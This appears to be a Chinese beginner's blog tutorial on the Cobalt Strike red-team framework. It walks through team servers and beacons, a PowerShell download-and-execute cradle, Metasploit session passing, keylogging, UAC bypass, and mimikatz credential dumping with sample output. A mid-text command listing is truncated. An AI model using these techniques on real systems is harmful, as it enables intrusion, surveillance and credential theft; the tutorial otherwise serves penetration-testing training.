# Cobalt Strike Basic No.1


体系化总结一下Cobalt Strike的基本知识和使用，主要面向新手，希望可以快速上手该工具，建立系统化知识结构。

<!--more-->

## 一、基础操作

### 简介

Cobalt Strike是一款渗透测试神器，简称CS，早期依赖Metasploit框架，现在已作为单独的平台使用。

Cobalt Strike集成了端口转发、扫描、监听Listener、Windows exe程序payload生成、Windows DLL动态链接库payload生成、java程序payload生成、office宏代码payload生成，还包括站点克隆、获取浏览器的相关信息等功能。

![image-20240222143954956](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221439991.png)

### 组织结构

Cobalt Strike采用的是C/S架构，server端连接到目标服务器，client再连接server。所以，client不会直接与目标服务器进行交互。设计的主要目的是为了分布式团队协作。

文件目录结构如下：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1]
└─$ tree -L 2 .
.
├── Client
│   ├── cobaltstrike.auth
│   ├── cobaltstrike-client.cmd		-- Windows client启动文件
│   ├── cobaltstrike-client.jar		-- client启动jar文件
│   ├── cobaltstrike-client.sh		-- Linux/MacOS client启动文件
│   └── uHook.jar							
└── Server
    ├── c2lint				-- 检查profile的错误和异常
    ├── cobaltstrike.auth
    ├── cobaltstrike.store              -- server和client加密通信的证书
    ├── data
    ├── downloads                       -- 文件下载目录
    ├── logs                            -- 日志目录
    ├── screenshots                     -- 截图目录
    ├── source-common.sh
    ├── teamserver			-- server启动脚本
    ├── TeamServerImage			-- 实际的启动elf文件
    └── third-party		        -- 第三方工具
```



### 连接方式

Cobalt Strike的client想要连接server需要知道三个信息：

- server的外部ip地址
- serve的连接密码
- (optional)决定malleable C2工具的哪一个配置文件用于server

#### 开启server

开启server的常规命令如下（Linux环境）：

```shell
./teamserver your_ip your_password [config_file]


┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1/Server]
└─$ sudo ./teamserver 172.16.86.138 v4ler1an
[sudo] password for v4ler1an:

[*] Will use existing X509 certificate and keystore (for SSL)

[*] Starting teamserver
[*] Team Server Version: 4.9.1 (Pwn3rs)
[*] Setting 'https.protocols' system property: SSLv3,SSLv2Hello,TLSv1,TLSv1.1,TLSv1.2,TLSv1.3
... ...
[+] Team server is up on 0.0.0.0:50050
[*] SHA256 hash of SSL cert is: xxxx
[+] Listener: test started!
```

#### client连接server

client可以在Windows、Linux、MaxOS下运行，根据个人需求来就行。4.9版本的client的目录下的启动文件如下:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1/Client]
└─$ ls
cobaltstrike.auth  cobaltstrike-client.cmd  cobaltstrike-client.jar  cobaltstrike-client.sh  uHook.jar
```

直接运行对应的文件即可。

![image-20240222142725955](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221427358.png)

点击Connect后，第一次连接会有提示信息，要求确认提示信息中的hash是不是server的hash，确认是就点击Yes，就可以进入client的GUI界面：

![image-20240222142904061](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221429093.png)

成功连接后，团队成员直接可以直接在client中进行交流沟通，信息共享等。

#### client连接不同的server

Cobalt Strike的设计初衷是在不同的阶段使用不同的server，因此在一次渗透行动中往往会使用到多个server。这样设计的目的主要是进行任务隔离，确保安全，在一个server出现意外停止运行时，不会影响到整个渗透过程。

连接不同的server，在client的左上角的+号，输入server信息即可连接：

![image-20240222145413463](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454506.png)

![image-20240222145445280](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454315.png)

此时在最下方就会有多个server连接的切换条。

### 分布式协作

这里以最基本的团队模型为例，涉及三个server：

- Staging Servers，临时服务器，主要为了在短时间内对目标系统进行访问，也是最开始用于传递payload、获取初始权限的server，承担了初始的权限提升和下载权限维持程序的功能，暴露风险较大。
- Long Haul Servers，持久化访问服务器，保持对目标网络的长期访问，以较低频率与目标进行通信。
- Post-Exploitation Servers，后渗透服务器，进行后渗透及横向移动的相关任务，比如与目标进行交互式访问。

#### 可伸缩红队操作模型

Scaling Red Operations，可伸缩红队操作模型，分为两个层次，第一层次是针对单个目标网络的目标单元；第二层次是针对多个目标网络的权限管理单元。

目标单元的工作：

- 负责具体目标或行动的对象
- 获得访问权限、后渗透、横向移动
- 维护本地基础设施

访问管理单元的工作：

- 保持所有目标网络的访问权限
- 获取访问权限并接收来自单元的访问
- 根据需要传递对目标单元的访问
- 为持续回调保持全局基础环境

#### 团队角色

- 初始渗透人员，主要任务是进入目标系统，并扩大立足点
- 后渗透人员，主要任务是对目标系统进行数据挖掘、对用户进行监控、收集目标系统的密钥、日志等敏感信息
- 权限管理人员，主要任务是建立基础设施、保持shell的持久化访问、管理回调、传递全局访问管理单元之间的会话

### 日志与报告

#### 日志记录

Cobalt Strike的日志文件在团队服务器下的运行目录中的`logs`文件夹内，其中有些日志文件名例如`beacon_11309.log`，这里的`11309`就是beacon会话的ID。

按键的日志在`keystrokes`文件夹内，截屏的日志在`screenshots`文件夹内，截屏的日志名称一般如`screen_015321_4826.jpg`类似，其中`015321`表示时间（1点53分21秒），`4826`表示ID。

#### 导出报告

Cobalt Strike生成报告的目的在于培训或帮助蓝队，在`Reporting`菜单栏中就可以生成报告，关于生成的报告有以下特点：

- 输出格式为PDF或者Word格式
- 可以输出自定义报告并且更改图标（Cobalt Strike –> Preferences –>Reporting）
- 可以合并多个团队服务器的报告，并可以对不同报告里的时间进行校正。

#### 报告类型

![image-20240222153927259](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221539311.png)

- 活动报告（Activity Report）

  提供红队活动的时间表，记录了每个后渗透活动。

- 主机报告（Hosts Report）

  汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也包含在报告内。

- 入侵指标报告（Indicators of Compromise）

  包括对C2扩展文件的分析、使用的域名和上传文件的md5。

- 会话报告（Sessions Report）

  记录了每个会话的指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。

- 社工报告（Social Engineering Report）

  记录了每一轮网络钓鱼的电子邮件、谁点击了邮件以及从每个点击用户处收集的信息。该报告还显示了CS的System profiler发现的应用程序。

- TTP报告（Tactics，Techniques，and Procedures）

  将自己的CS行动与ATT&CK矩阵进行映射，给出具体的ttp。

## 二、基础设施

### Listener管理

定义：等待受害目标回连自己的一个服务。

作用：主要是为了接受payload回传的各类数据，类似于msf中的handler。例如，payload在目标机器执行后，就会回连到listener然后下载执行真正的shellcode代码。一旦listener建立成功，团队成员只需要知道这个listener的名称即可，不必关心listener背后的基础环境。

一个listener由用户定义的名称、payload类型和几个特定于payload的选项组成。Listener的名字一般由以下结构组成：

```shell
// 操作系统/攻击载荷/传输器
Operating System/Payload/Stager


example:
windows/beacon_http/reverse_http
```

#### Stager

payload是需要执行的具体攻击内容，通常分为两部分：stager和stage。

stager是一个体积较小的程序，用于连接、下载stage，并插入到内存中。

为什么会有stager的概念？这是因为在很多攻击中，对于能加载到内存并在成功漏洞利用后执行的数据大小存在严格的限制，这就导致在攻击成功时，很难嵌入额外的payload，因此出现了stager。

#### 创建Listener

在CS的client中打开Cobalt Strike -> Listeners，之后点击下方的Add，弹出New Listener窗口：

![image-20240222173802492](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221738559.png)

CS的listener目前有三种类型：

- Beacon类型：直译是信标的意思，是以一种比较隐蔽的后渗透代理，也是CS默认使用的一种类型。Beacon Listener的名称例子如下：

  ```shell
  windows/beacon_http/reverse_http
  ```

- Foreign类型：外部listener，主要作用是给其他的payload提供别名，比如msf中的payload。该类型的listener主要是为了提升CS的兼容性，payload可以使用其他的软件生成，但是可以适配CS的listener：

  ```shell
  windows/foregin/reverse_https
  ```

- External C2（新增）：使用其他类型的C2，是新增选项，允许第三方程序使用外部C2服务器与CS的server进行交互。

![image-20240222173926470](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221739566.png)

### HTTP和HTTPS Beacon

**Beacon**

- Beacon是CS的Payload
- Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。
- 通过HTTP、HTTPS和DNS出口网络
- 使用SMB协议的时候是点对点通信
- Beacon有很多的后渗透攻击模块和远程管理工具

**Beacon的类型**

- HTTP 和 HTTPS Beacon HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。

```
  windows/beacon_http/reverse_http
  windows/beacon_https/reverse_https
```

- DNS Beacon

```
  windows/beacon_dns/reverse_dns_txt
  windows/beacon_dns/reverse_http
```

- SMB Beacon SMB Beacon也可以叫做pipe beacon

```
  windows/beacon_smb/bind_pipe
```

**创建HTTP Beacon**

点击 Cobalt Strike –> Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save。

![image-20240223110739474](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231107596.png)

测试一下刚才设置的监听器，点击Attack –> Web Drive-by –> Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，最后点击Launch:

![image-20240223111429362](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231114442.png)

![image-20240223110840913](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231108981.png)

复制弹窗中的命令到靶机中执行：

```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.86.138:80/test'))"
```

![image-20240223111527176](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231115256.png)

回到CS，靶机已经上线：

![image-20240223111606515](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231116605.png)

![image-20240223111800363](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231118446.png)

**HTTPS Beacon**

HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：https://www.cobaltstrike.com/help-malleable-c2#validssl。

### DNS Beacon

使用DNS请求将Beacon返回。这些DNS请求用于解析由你的CS团队服务器作为权威DNS服务器的域名。DNS响应告诉Beacon休眠或是连接到团队服务器来下载任务，DNS响应也告诉 Beacon 如何从你的团队服务器下载任务。

在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。

DNS Beacon的工作流程具体如下：

首先，CS服务器向目标发起攻击，将DNS Beacon传输器嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器回连下载CS服务器上的DNS Beacon传输体，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。

![image-20240223161626900](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231616992.png)

原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。

根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。

**域名配置**

既然是配置域名，所以就需要先有个域名，添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。然后服务器配置防火墙将UDP的53端口放通。（这里我没有多余的服务器和域名，借用eastjun师傅的图）

![image-20211202223623912](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124025.png)

配置完可以使用nslookup进行测试

![image-20211202224423180](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124031.png)

CS中创建监听器时填写NS记录的域名：

![image-20211202223356738](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124673.png)

靶机上线后不会像其他Beacon一样在第一次连接时就发送目标相关信息，在没有任务的情况下CS服务器都是简单响应DNS请求而不做任何操作，在执行任何一条命令之后靶机会将目标相关信息提交过来。

![image-20211202225129950](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124991.png)

### SMB Beacon

SMB Beacon使用命名管道通过一个父Beacon进行通信，这种对等通信对同一台主机上的Beacon和跨网络的Beacon都有效。Windows将命名管道通信封装仔SMB协议中，因此得名SMB Beacon。

因为使用SMB协议通信，Windows的系统防火墙默认放通445端口，所以SMB Beacon在绕防火墙时可能会有意外作用。

![img](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271913214.png)

**SMB Beacon配置**

首先需要一个上线的主机，上线后新建一个SMB Beacon，输入listener名称，选择Beacon SMB，pipename使用默认值即可：

![image-20240227191613502](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271916564.png)

然后在初始beacon中迁移到smb beacon：

![image-20240227191819912](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271918975.png)

迁移完成后：

![image-20240227191913542](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271919603.png)

可以看到派生的SMB Beacon，在external的ip后有个`∞∞`字符。此时SMB Beacon通过父级的HTTPS Beacon与CS服务器进行通信，而SMB Beacon与HTTPS Beacon通过SMB协议进行通信。

![image-20240227192123585](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271921658.png)

随后，我们把SMB Beacon注入到一个进程中：

![image-20240227192323558](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271923150.png)

注入完成后，SMB Beacon就转变为对应进程派生的beacon了：

![image-20240227192530624](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271925697.png)

如果需要断开和某个会话的连接，使用unlink命令即可，想再次连上使用link就可以。

### TCP Beacon

TCP Beacon与SMB Beacon类似，区别在于使用的是TCP协议与父级Beacon进行通信，使用这种方式上线时流量时不加密的。

在新建tcp beacon时可以指定监听的端口，假设为8888，在不出网的目标主机上执行后，目标主机会监听8888端口，然后父Beacon中使用connect命令进行连接：

![image-20220213210419805](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271944597.png)

### Foreign Beacon

使用CS的Foreign Beacon可以派生到meterpreter会话，有http和https两种监听器。

首先在msf中起一个监听器：

```shell
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
msf exploit(handler) > set lhost 10.211.55.2
lhost => msf ip
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > exploit
```

然后在cs里配置，填上msf的ip和监听端口。

然后选择会话右键派生，会话选择forign beacon：

![image-20240227195131535](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271951624.png)

随后在msf中就会接收到会话：

![image-20240227195228315](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271952409.png)


            Start/Stop a SOCKS4a/SOCKS5 server to relay traffic
    spawn                     Spawn a session 
    spawnas                   Spawn a session as another user
    spawnto                   Set executable to spawn processes into
    spawnu                    Spawn a session under another process
    spunnel                   Spawn and tunnel an agent via rportfwd
    spunnel_local             Spawn and tunnel an agent via Cobalt Strike client rportfwd
    ssh                       Use SSH to spawn an SSH session on a host
    ssh-key                   Use SSH to spawn an SSH session on a host
    steal_token               Steal access token from a process
    syscall-method            Change or query the syscall method
    timestomp                 Apply timestamps from one file to another
    token-store               Hot-swappable access tokens
    unlink                    Disconnect from parent Beacon
    upload                    Upload a file
    windows_error_code        Show the Windows error code for a Windows error code number
```

### session传递

**会话传递相关命令**

Beacon 被设计的最初目的就是向其他的 CS 监听器传递会话。

- `spawn`：进行会话的传递，也可直接右击会话选择`spawn`命令进行会话的选择。默认情况下，`spawn`命令会在 rundll32.exe 中派生一个会话。为了更好的隐蔽性，可以找到更合适的程序（如 Internet Explorer） 并使用`spawnto`命令来说明在派生新会话时候会使用 Beacon 中的哪个程序。
- `spawnto`：该命令会要求指明架构（x86 还是 x64）和用于派生会话的程序的完整路径。单独输入`spawnto`命令然后按 enter 会指示 Beacon 恢复至其默认行为。
- `inject`：输入`inject + 进程 id + 监听器名`来把一个会话注入一个特定的进程中。使用 ps 命令来获取一个当前系统上的进程列表。使用`inject [pid] x64`来将一个64位 Beacon 注入到一个 64位进程中。
- `spawn`和`inject`命令都将一个 payload stage 注入进内存中。如果 payload stage 是 HTTP、HTTPS 或 DNS Beacon 并且它无法连接到你，那么将看不到一个会话。如果 payload stage 是一个绑定的 TCP 或 SMB 的 Beacon，这些命令会自动地尝试连接到并控制这些 payload。
- `dllinject`：`dllinject + [pid]`来将一个反射性 DLL 注入到一个进程中。
- `shinject`：使用`shinject [pid] [架构] [/路径/.../file.bin]`命令来从一个本地文件中注入 shellcode 到一个目标上的进程中。
- `shspawn`：使用`shspawn [架构] [/路径/.../file.bin]`命令会先派生一个新进程（这个新进程是 spawn to 命令指定的可执行文件），然后把指定的 shellcode 文件（ file.bin ）注入到这个进程中。
- `dllload`：使用`dllload [pid] [c:\路径\...\file.dll]`来在另一个进程中加载磁盘上的 DLL文件。

**会话传递使用场景**

1、将当前会话传递至其他CS团队服务器中，直接右击`spawn`选择要传递的监听器即可。

2、将当前会话传递至MSF中，这里简单做一下演示。

首先，在MSF中，为攻击载荷新建一个payload

```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
msf5 exploit(multi/handler) > set lhost 192.168.175.156
msf5 exploit(multi/handler) > set lport 443
msf5 exploit(multi/handler) > exploit -j
```

随后，在CS中新建一个外部`Foreign`监听器，这里设置的监听IP与端口和MSF中的一致即可，随后在CS中利用`spawn`选择刚新建的外部监听器，MSF中即可返回会话。

### File System

浏览会话系统文件位置在右击会话处，选择 `Explore --> File Browser`即可打开。在这里可以对当前会话下的文件进行浏览、上传、下载、删除等操作。

在进行文件浏览时，如果 beacon 设置的 sleep 值较高，CS会因此而变得响应比较慢。

![image-20220214104914725](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281221465.png)

彩色文件夹表示该文件夹的内容位于此文件浏览器的缓存中；深灰色的文件夹表示该文件夹的内容不在此文件浏览器缓存中。

**文件下载**

- `download`：下载请求的文件。Beacon 会下载它的任务要求获取的每一个文件的固定大小的块。这个块的大小取决于 Beacon 当前的数据通道。HTTP 和 HTTPS 通道会拉取 512kb 的数据块。
- `downloads`：查看当前 Beacon 正在进行的文件下载列表。
- `cancel`：该命令加上一个文件名来取消正在进行的一个下载任务。也可以在 cancel 命令中使用通配符来一次取消多个文件下载任务。

下载文件都将下载到CS团队服务器中，在`View --> Download`下可看到下载文件的记录，选中文件后使用`Sync Files`即可将文件下载到本地。

**文件上传**

- `upload`：上传一个文件到目标主机上。
- `timestomp`：将一个文件的修改属性访问属性和创建时间数据与另一个文件相匹配。当上传一个文件时，有时会想改变此文件的时间戳来使其混入同一文件夹下的其他文件中，使用timestomp 命令就可以完成此工作。

### 用户驱动溢出攻击

Beacon 运行任务的方式是以`jobs`去运行的，比如键盘记录、PowerShell 脚本、端口扫描等，这些任务都是在 beacon check in 之间于后台运行的。

- `jobs`：查看当前 Beacon 中的任务
- `jobkill`：加上任务 ID，对指定任务进行停止

**屏幕截图**

- `screenshot`：获取屏幕截图，使用`screenshot pid`来将截屏工具注入到一个 x86 的进程中，使用`screenshot pid x64`注入到一个 x64 进程中，explorer.exe 是一个不错的候选程序。 使用`screenshot [pid] [x86|x64] [time]`来请求截屏工具运行指定的秒数，并在每一次 Beacon 连接到团队服务器的时候报告一张屏幕截图，这是查看用户桌面的一种简便方法。要查看截屏的具体信息，通过`View --> Screenshots`来浏览从所有 Beacon 会话中获取的截屏。

**键盘记录**

- `keylogger`：键盘记录器，使用`keylogger pid`来注入一个 x86 程序。使用`keylogger pid x64`来注入一个 x64 程序，explorer.exe 是一个不错的候选程序。 使用单独的 keylogger 命令来将键盘记录器注入一个临时程序。键盘记录器会监视从被注入的程序中的键盘记录并将结果报告给 Beacon，直到程序终止或者自己杀死了这个键盘记录后渗透任务。要查看键盘记录的结果，可以到`View --> Keystrokes`中进行查看。

  ![image-20240228123808776](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281238859.png)

**其他**

除了上述使用命令的方式进行屏幕截图和键盘记录，也可以来到`Explore --> Process List`下选择要注入的进程，再直接点击屏幕截图或键盘记录的功能按钮。

从使用上，具体注入那个程序都是可以的，只是注入 explorer.exe 会比较稳定与持久。值得注意的是，多个键盘记录器可能相互冲突，每个桌面会话只应使用一个键盘记录器。

### Browser Pivoting

浏览器劫持是指在已经攻击成功的目标中，利用目标的信息登录网站进行会话劫持，但是目前只支持目标正在使用IE浏览器的前提下。关于如何判断当前用户是否使用IE浏览器，则可以通过屏幕截图来判断。

![image-20240228123924934](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281239030.png)

![image-20240228123943465](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281239559.png)

找到目前正在使用IE浏览器的目标后，右击该会话，选择`Explore --> Browser Pivot`，随后选择要注入的进程，CS 会在它认为可以注入的进程右边显示一个对勾，设置好端口后，点击运行即可。

此时，在浏览器中配置代理，代理配置为http代理，IP为CS团队服务器IP，端口为刚设置的端口。

代理配置好后，在浏览器中打开目标当前正在打开的网址，即可绕过登录界面。

### Elevate with an Exploit

**elevate**：列出CS已经注册的权限提升的可用列表

**elevate [exploit] [listener]**：使用具体的exploit执行权限提升，beacon给到指定的listener

![image-20240228161720292](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281617398.png)

这里给出的可用exp有很多，默认的只有两个，其他的使用了第三方脚本：https://github.com/rsmudge/ElevateKit

此处我们的目标是高版本的windows 10系统，所以上述方法基本全军覆没，我只测试了一个`uac-schtasks`成功提权到admin：

![image-20240228164701226](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281647332.png)

![image-20240228164719594](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281647702.png)

在尝试了所有方法都不行的时候就需要自行上传提权工具或者exp，进行权限提升。

**runasadmin**：使用管理员权限执行单条命令

![image-20240228165055680](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281650810.png)

### Elevate with Known Credentials

如果提前获取了一些账号密码，则可以使用已知的高权限账号密码来提权。

**runas [DOMAIN\user] [password] [command]**- This runs a command as another user using their credentials. The runas command will not return any output. You may use runas from a non- privileged context though.

**spawnas [DOMAIN\user] [password] [listener]** - This command spawns a session as another user using their credentials. This command spawns a temporary process and injects your payload stage into it.

使用这两个命令时，请注意非 SID 500 帐户的凭据将在中等完整性上下文中生成有效负载。 需要使用绕过 UAC 来提升到高完整性上下文。 此外，应该从指定帐户可以读取的工作文件夹运行这些命令。

### Get SYSTEM

伪造一个SYSTEM账户的token。

**getsystem** - This command impersonates a token for the SYSTEM account. This level of access may allow you to perform privileged actions that are not possible as an Administrator user.

Another way to get SYSTEM is to create a service that runs a payload. The **elevate svc-exe [listener]** command does this. It will drop an executable that runs a payload, create a service to run it, assume control of the payload, and cleanup the service and executable.

### UAC Bypass

如果当前的用户不是`Administrator`的话，这种方式可能不成功，所以先用`run whoami /groups`看一下当前用户是否在`Administrators`组里面。

常用的有以下几种：

**elevate uac-token-duplication [listener]** - This command spawns a temporary process with elevated rights and inject a payload stage into it. This attack uses a UAC-loophole that allows a non-elevated process to launch an arbitrary process with a token stolen from an elevated process. This loophole requires the attack to remove several rights assigned to the elevated token. The abilities of your new session will reflect these restricted rights. If Always Notify is at its highest setting, this attack requires that an elevated process is already running in the current desktop session (as the same user). This attack works on Windows 7 and Windows 10 prior to the November 2018 update.

![image-20240228171453255](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281714393.png)

**runasadmin uac-token-duplication [command]** - This is the same attack described above, but this variant runs a command of your choosing in an elevated context.

**runasadmin uac-cmstplua [command]** - This command attempta to bypass UAC and run a command in an elevated context. This attack relies on a COM object that automatically elevates from certain process contexts (Microsoft signed, lives in c:\windows\*).

### Mimikatz

在 Beacon 中集成了 mimikatz ，mimikatz 执行命令有三种形式：

- `mimikatz [module::command] <args>` 运行 mimikatz 命令
- `mimikatz [!module::command] <args>` 强制提升到 SYSTEM 权限再运行命令，因为一些命令只有在 SYSTEM 身份下才能被运行。
- `mimikatz [@module::command] <args>` 使用当前 Beacon 的访问令牌运行 mimikatz 命令

下面是一些`mimikatz`命令。

- `!lsadump::cache` 获取缓存凭证，默认情况下 Windows 会缓存最近10个密码哈希
- `!lsadump::sam` 获取本地账户密码哈希，该命令与 hashdump 比较类似
- `misc::cmd` 如果注册表中禁用了 CMD ，就重新启用它
- `!misc::memssp` 注入恶意的 Windows SSP 来记录本地身份验证凭据，这个凭证存储在“C:\windows\system32\mimilsa.log”中
- `misc::skeleton` 该命令仅限域内使用。该命令会给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用,其原理是对 lsass.exe 进行注入，重启后会失效。
- `process::suspend [pid]` 挂起某个进程，但是不结束它
- `process::resume [pid]` 恢复挂起的进程

以上的这些只是`mimikatz`能做事情的一小部分，下面看看`!misc::memssp`的使用。

```
mimikatz !misc::memssp
cd C:\Windows\system32
shell dir mimilsa.log
shell type mimilsa.log
```

详细运行过程：

首先运行`mimikatz !misc::memssp`

```
beacon> mimikatz !misc::memssp
[*] Tasked beacon to run mimikatz's !misc::memssp command
[+] host called home, sent: 1006151 bytes
[+] received output:
Injected =)
```

接下来来到`C:\Windows\system32`目录

```
beacon> cd C:\Windows\system32
[*] cd C:\Windows\system32
[+] host called home, sent: 27 bytes
 
beacon> shell dir mimilsa.log
[*] Tasked beacon to run: dir mimilsa.log
[+] host called home, sent: 46 bytes
[+] received output:
 驱动器 C 中的卷没有标签。
 卷的序列号是 BE29-9C84
 
 C:\Windows\system32 的目录
 
2020/07/23  21:47                24 mimilsa.log
               1 个文件             24 字节
               0 个目录 17,394,728,960 可用字节
```

可以看到是存在`mimilsa.log`文件的，此时待目标主机重新登录，比如电脑锁屏后用户进行登录。

查看`mimilsa.log`文件内容。

```
beacon> shell type mimilsa.log
[*] Tasked beacon to run: type mimilsa.log
[+] host called home, sent: 47 bytes
[+] received output:
[00000000:000003e5] \    
[00000000:002b99a7] WIN-75F8PRJM4TP\Administrator    Password123!
```

成功获取到当前登录用户的明文密码。

### Credential and Hash Harvesting

需要在管理员权限的session下执行。

想要获取凭证信息，可以在管理员权限的会话处右击选择`Access --> Dump Hashes`，或者在控制台中使用`hashdump`命令。

![image-20240228173042362](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281730514.png)

想获取当前用户的密码，可以运行`mimikatz`，右击管理员权限会话选择`Access --> Run Mimikatz`，或在控制台运行`logonpasswords`命令。

![image-20240228173025010](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281730161.png)

在`View --> Credentials`下可以查看到`hashdump`与`mimikatz`获取的数据。

![image-20240228173105853](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281731994.png)

To dump hashes, go to **[beacon]** -> **Access** -> **Dump Hashes**. You can also use the **hashdump [pid] [x86|x64]** command from the Beacon console to inject the hashdump tool into the specified process. Use **hashdump** (without [pid] and [arch] arguments) to spawn a temporary process and inject the hashdump tool into it. These commands will spawn a job that injects into LSASS and dumps the password hashes for local users on the current system. This command requires administrator privileges. If injecting into a pid that process requires administrator privileges.

Use **logonpasswords [pid] [arch]** to inject into the specified process to dump plaintext credentials and NTLM hashes. Use **logonpasswords** (without [pid] and [arch] arguments) to spawn a temporary process to dump plaintext credentials and NTLM hashes. This command uses mimikatz and requires administrator privileges.

Use **dcsync [pid] [arch] [DOMAIN.fqdn] <DOMAIN\user>** to inject into the specified process to extract the NTLM password hashes. Use **dcsync [DOMAIN.fqdn] <DOMAIN\user>** to spawn a temporary process to extract the NTLM password hashes. This command uses mimikatz to extract the NTLM password hash for domain users from the domain controller. Specify a user to get their hash only. This command requires a domain administrator trust relationship.

Use **chromedump [pid] [arch]** to inject into the specified process to recover credential material from Google Chrome. Use **chromedump** (without [pid] and [arch] arguments) to spawn a temporary process to recover credential material from Google Chrome. This command will use Mimikatz to recover the credential material and should be run under a user context.

Credentials dumped with the above commands are collected by Cobalt Strike and stored in the credentials data model. Go to **View** -> **Credentials** to pull up the credentials on the current team server.

### Port Scanning

- `portscan`：进行端口扫描，使用参数为：`portscan [targets] [ports] [discovery method]`。 目标发现`discovery method`有三种方法，分别是：`arp、icmp、none`，`arp`方法使用 ARP 请求来发现一个主机是否存活。`icmp`方法发送一个 ICMP echo 请求来检查一个目标是否存活。`none`选项让端口扫描工具假设所有的主机都是存活的。

端口扫描会在 Beacon 和团队服务器通讯的这个过程中不停运行。当它有可以报告的结果，它会把结果发送到 Beacon 控制台。Cobalt Strike 会处理这个信息并使用发现的主机更新目标模型。

![image-20240228124315102](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281244161.png)

右击 Beacon会话，在`Explore --> Port Scan`中即可打开端口扫描的图形窗口，CS会自动填充扫描地址，确认扫描地址、端口、扫描方式等无误后，开始扫描即可。扫描结束后，在 target table页面中可看到扫描结果，右击会话，选择 Services 可查看详细的扫描结果。

